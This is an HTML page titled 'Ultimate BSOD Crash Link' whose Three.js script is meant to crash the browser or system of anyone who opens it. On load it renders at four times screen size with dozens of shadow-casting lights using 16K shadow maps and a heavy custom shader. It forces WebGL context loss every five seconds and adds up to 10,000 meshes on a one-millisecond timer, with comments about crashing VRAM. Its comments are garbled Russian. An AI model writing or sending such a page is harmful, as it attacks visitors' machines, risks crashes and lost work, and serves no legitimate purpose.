<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>üíÄ Ultimate BSOD Crash Link üíÄ</title>
<style>
  body, html { margin: 0; overflow: hidden; height: 100%; background: black; }
  canvas { display: block; }
</style>
</head>
<body>

<script src="https://cdn.jsdelivr.net/npm/three@0.152.2/build/three.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/three@0.152.2/examples/js/postprocessing/EffectComposer.js"></script>
<script src="https://cdn.jsdelivr.net/npm/three@0.152.2/examples/js/postprocessing/RenderPass.js"></script>
<script src="https://cdn.jsdelivr.net/npm/three@0.152.2/examples/js/postprocessing/UnrealBloomPass.js"></script>
<script src="https://cdn.jsdelivr.net/npm/three@0.152.2/examples/js/postprocessing/ShaderPass.js"></script>

<script>
let scene, camera, renderer, composer;
const meshes = [];
const speeds = [];

init();
animate();

function init() {
  scene = new THREE.Scene();

  const width = window.innerWidth * 4;
  const height = window.innerHeight * 4;

  camera = new THREE.PerspectiveCamera(75, width / height, 0.1, 10000);
  camera.position.z = 1200;

  renderer = new THREE.WebGLRenderer({antialias: false});
  renderer.setSize(width, height);
  renderer.shadowMap.enabled = true;
  renderer.shadowMap.type = THREE.PCFSoftShadowMap;
  document.body.appendChild(renderer.domElement);

  // 150 –æ—á–µ–Ω—å —Å–ª–æ–∂–Ω—ã—Ö –º–æ–¥–µ–ª–µ–π subdivision=6 (~20–∫ —Ç—Ä–µ—É–≥–æ–ª—å–Ω–∏–∫–æ–≤ –∫–∞–∂–¥–∞—è)
  for(let i = 0; i < 150; i++) {
    const geo = new THREE.IcosahedronGeometry(40, 6);
    const mat = new THREE.MeshStandardMaterial({
      color: new THREE.Color(Math.random(), Math.random(), Math.random()),
      roughness: 0,
      metalness: 1,
      emissive: new THREE.Color(Math.random(), Math.random(), Math.random()),
      emissiveIntensity: 3
    });
    const mesh = new THREE.Mesh(geo, mat);
    mesh.position.set(
      (Math.random() - 0.5) * 3000,
      (Math.random() - 0.5) * 3000,
      (Math.random() - 0.5) * 3000
    );
    mesh.castShadow = true;
    mesh.receiveShadow = true;
    scene.add(mesh);
    meshes.push(mesh);
    speeds.push(10 + Math.random() * 20); // –±–µ—à–µ–Ω–∞—è —Å–∫–æ—Ä–æ—Å—Ç—å –≤—Ä–∞—â–µ–Ω–∏—è
  }

  // 32 –∏—Å—Ç–æ—á–Ω–∏–∫–∞ —Å–≤–µ—Ç–∞ —Å —Ç–µ–Ω—è–º–∏ 16K —Ö 16K ‚Äî 100% VRAM –∫—Ä–∞—Ö
  for(let i = 0; i < 32; i++) {
    const light = new THREE.PointLight(0xffffff, 10, 3000);
    light.position.set(
      (Math.random() - 0.5) * 3000,
      (Math.random() - 0.5) * 3000,
      (Math.random() - 0.5) * 3000
    );
    light.castShadow = true;
    light.shadow.mapSize.width = 16384;
    light.shadow.mapSize.height = 16384;
    scene.add(light);
  }

  // Directional light —Å —Ç–µ–Ω—è–º–∏ 16–ö
  const dirLight = new THREE.DirectionalLight(0xffffff, 10);
  dirLight.position.set(0, 2000, 2000);
  dirLight.castShadow = true;
  dirLight.shadow.mapSize.width = 16384;
  dirLight.shadow.mapSize.height = 16384;
  dirLight.shadow.camera.left = -3000;
  dirLight.shadow.camera.right = 3000;
  dirLight.shadow.camera.top = 3000;
  dirLight.shadow.camera.bottom = -3000;
  dirLight.shadow.camera.near = 0.1;
  dirLight.shadow.camera.far = 6000;
  scene.add(dirLight);

  // –ü–æ—Å—Ç–æ–±—Ä–∞–±–æ—Ç–∫–∞ —Å 2 —Å–ª–æ—è–º–∏ bloom + –æ—á–µ–Ω—å —Ç—è–∂–µ–ª—ã–π —à–µ–π–¥–µ—Ä
  composer = new THREE.EffectComposer(renderer);
  composer.setSize(width, height);

  composer.addPass(new THREE.RenderPass(scene, camera));

  const bloom1 = new THREE.UnrealBloomPass(new THREE.Vector2(width, height), 6.0, 2.5, 1.2);
  composer.addPass(bloom1);

  const bloom2 = new THREE.UnrealBloomPass(new THREE.Vector2(width, height), 8.0, 3.0, 1.5);
  composer.addPass(bloom2);

  // –¢—è–∂–µ–ª–µ–Ω–Ω—ã–π –∫–∞—Å—Ç–æ–º–Ω—ã–π —à–µ–π–¥–µ—Ä —Å 50 –∏—Ç–µ—Ä–∞—Ü–∏—è–º–∏ –∏ —Å–ª–æ–∂–Ω—ã–º–∏ —Å–∏–Ω—É—Å–∞–º–∏
  const HeavyShader = {
    uniforms: {
      tDiffuse: { value: null },
      time: { value: 0 }
    },
    vertexShader: `
      varying vec2 vUv;
      void main() {
        vUv = uv; 
        gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
      }
    `,
    fragmentShader: `
      uniform sampler2D tDiffuse;
      uniform float time;
      varying vec2 vUv;

      float complexNoise(vec2 uv) {
        float n = 0.0;
        for(int i = 0; i < 50; i++) {
          float angle = time * 30.0 + float(i) * 6.2831 / 50.0;
          vec2 offset = vec2(cos(angle), sin(angle)) * 0.005 * float(i);
          n += sin(uv.x * 1000.0 + offset.x * 500.0) * cos(uv.y * 1000.0 + offset.y * 500.0);
        }
        return n / 50.0;
      }

      void main() {
        vec4 color = texture2D(tDiffuse, vUv);
        float noise = complexNoise(vUv + vec2(time * 0.1));
        color.rgb += noise * 0.8;
        gl_FragColor = color;
      }
    `
  };

  const heavyPass = new THREE.ShaderPass(HeavyShader);
  composer.addPass(heavyPass);

  // –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω—ã–π —Å–±—Ä–æ—Å –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞ WebGL –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥ (–¥—Ä–∞–π–≤–µ—Ä–∞ –±—É–¥—É—Ç –Ω–µ—Ä–≤–Ω–∏—á–∞—Ç—å)
  setInterval(() => {
    try {
      renderer.forceContextLoss();
      console.warn('üî• Forced WebGL context loss!');
    } catch(e) {}
  }, 5000);

  window.addEventListener('resize', onWindowResize);

  // –ü–∞–º—è—Ç—å-—É—Ç–µ—á–∫–∞ ‚Äî 10000 –≥–µ–æ–º–µ—Ç—Ä–∏–π —Å –º–∞—Ç–µ—Ä–∏–∞–ª–∞–º–∏ –¥–æ–±–∞–≤–ª—è—é—Ç—Å—è –ø–æ —Ç–∞–π–º–µ—Ä—É, —Ç–æ—Ä–º–æ–∑—è GC –∏ –∂—Ä—É VRAM
  let leakCount = 0;
  function memoryLeak() {
    if(leakCount > 10000) return;
    const geo = new THREE.IcosahedronGeometry(15, 5);
    const mat = new THREE.MeshStandardMaterial({
      color: new THREE.Color(Math.random(), Math.random(), Math.random()),
      roughness: 0.1,
      metalness: 0.9
    });
    const mesh = new THREE.Mesh(geo, mat);
    mesh.position.set(
      (Math.random() - 0.5) * 4000,
      (Math.random() - 0.5) * 4000,
      (Math.random() - 0.5) * 4000
    );
    scene.add(mesh);
    leakCount++;
    setTimeout(memoryLeak, 1); // –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ —á–∞—Å—Ç–æ
  }
  memoryLeak();
}

function onWindowResize() {
  const width = window.innerWidth * 4;
  const height = window.innerHeight * 4;
  camera.aspect = width / height;
  camera.updateProjectionMatrix();
  renderer.setSize(width, height);
  composer.setSize(width, height);
}

function animate(time = 0) {
  requestAnimationFrame(animate);

  for(let i = 0; i < meshes.length; i++) {
    meshes[i].rotation.x += speeds[i] * 0.15;
    meshes[i].rotation.y += speeds[i] * 0.2;
    meshes[i].rotation.z += speeds[i] * 0.12;
  }

  composer.passes[composer.passes.length - 1].uniforms.time.value = time / 1000;

  composer.render();
}
</script>

</body>
</html>
